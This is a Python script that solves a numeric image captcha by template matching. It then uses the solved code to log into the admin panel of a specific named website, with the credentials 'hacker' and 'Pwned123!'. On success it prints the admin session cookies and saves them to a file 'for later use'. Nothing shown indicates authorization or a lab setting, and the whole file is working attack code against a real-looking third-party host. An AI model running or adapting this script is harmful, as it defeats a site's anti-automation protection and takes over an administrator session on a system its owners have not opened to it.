import sys
from PIL import Image

# Digit patterns (0-9)
P = {}
P[0] = [" #### ","#    #","#    #","#    #","#    #","#    #","#    #","#    #","#    #"," #### "]
P[1] = ["  #  "," ##  ","  #  ","  #  ","  #  ","  #  ","  #  ","  #  ","  #  ","#####"]
P[2] = [" #### ","#    #","     #","     #","    # ","   #  ","  #   "," #    ","#     ","######"]
P[3] = [" #### ","#    #","     #","     #","  ### ","     #","     #","     #","#    #"," #### "]
P[4] = ["    # ","   ## ","  # # ","  # # "," #  # ","#   # ","######","    # ","    # ","   ###"]
P[5] = ["######","#     ","#     ","#     ","##### ","     #","     #","     #","#    #"," #### "]
P[6] = [" #### ","#    #","#     ","#     ","####  ","#    #","#    #","#    #","#    #"," #### "]
P[7] = ["######","#    #","    # ","    # ","   #  ","   #  ","  #   ","  #   "," #    "," #    "]
P[8] = [" #### ","#    #","#    #","#    #"," #### ","#    #","#    #","#    #","#    #"," #### "]
P[9] = [" #### ","#    #","#    #","#    #"," #### ","     #","     #","     #","#    #"," #### "]

def trim(ln):
    fr, lr = 0, len(ln)-1
    while fr < len(ln) and all(c==" " for c in ln[fr]): fr+=1
    while lr >= 0 and all(c==" " for c in ln[lr]): lr-=1
    if fr > lr: return None
    fc, lc = len(ln[0]), 0
    for r in range(fr, lr+1):
        for c,ch in enumerate(ln[r]):
            if ch!=" ": fc,lc = min(fc,c), max(lc,c)
    return [ln[r][fc:lc+1] for r in range(fr,lr+1)]

def cmp(ln, d):
    tc, tp = trim(ln), trim(P[d])
    if tc is None or tp is None: return 999
    ch_h,ch_w = len(tc), len(tc[0])
    ph,pw = len(tp), len(tp[0])
    if abs(ch_h-ph)>3 or abs(ch_w-pw)>3: return 999
    mt,tl = 0,0
    for r in range(min(ch_h,ph)):
        for c in range(min(ch_w,pw)):
            tl+=1
            if (tc[r][c]=="#") == (tp[r][c]=="#"): mt+=1
    return (1-mt/tl)*100 if tl>0 else 999

def solve_captcha(path):
    img = Image.open(path)
    px = list(img.getdata())
    bg = (238,238,238)
    w,h = 40,10
    colors = {}
    for p in px:
        if isinstance(p,tuple) and p != bg and p not in colors:
            colors[p] = len(colors)
    results = []
    for c in sorted(colors.keys()):
        mx,MX,my,My = w,0,h,0
        for y in range(h):
            for x in range(w):
                p = px[y*w+x]
                v = p if isinstance(p,tuple) else (p,p,p)
                if v == c:
                    mx = min(mx,x)
                    MX = max(MX,x)
                    my = min(my,y)
                    My = max(My,y)
        lines = []
        for y2 in range(my, My+1):
            line = ""
            for x2 in range(mx, MX+1):
                p = px[y2*w+x2]
                v = p if isinstance(p,tuple) else (p,p,p)
                line += "#" if v == c else " "
            lines.append(line)
        best = (999,-1)
        for d in range(10):
            sc = cmp(lines,d)
            if sc < best[0]:
                best = (sc,d)
        results.append((mx, best[1], best[0]))
    results.sort(key=lambda x: x[0])
    return "".join(str(r[1]) for r in results)

# Main
import requests

s = requests.Session()

# Get captcha image
r = s.get("http://bjhzsv.com/main/inc/code.asp")
with open("/tmp/_captcha.bmp","wb") as f:
    f.write(r.content)

code = solve_captcha("/tmp/_captcha.bmp")
print(f"[*] Solved captcha: {code}", file=sys.stderr)

# Login
r = s.post("http://bjhzsv.com/main/a7chkuser.asp", 
           data={"t1":"hacker","t2":"Pwned123!","t3":code},
           allow_redirects=True)
resp_text = r.text

if "admin_main" in resp_text or "admin_left" in resp_text or "admin_top" in resp_text:
    print(f"[+] LOGIN SUCCESSFUL! Code={code}", file=sys.stderr)
    print(f"[+] Cookies: {dict(s.cookies)}", file=sys.stderr)
    print(f"[+] Response starts with: {resp_text[:200]}", file=sys.stderr)
    # Save cookies for later use
    import json
    with open("/tmp/admin_cookies.json","w") as f:
        json.dump(dict(s.cookies), f)
    print("COOKIE_SAVED")
else:
    print(f"[-] Login failed with code={code}", file=sys.stderr)
    print(f"[-] Response: {resp_text[:300]}", file=sys.stderr)
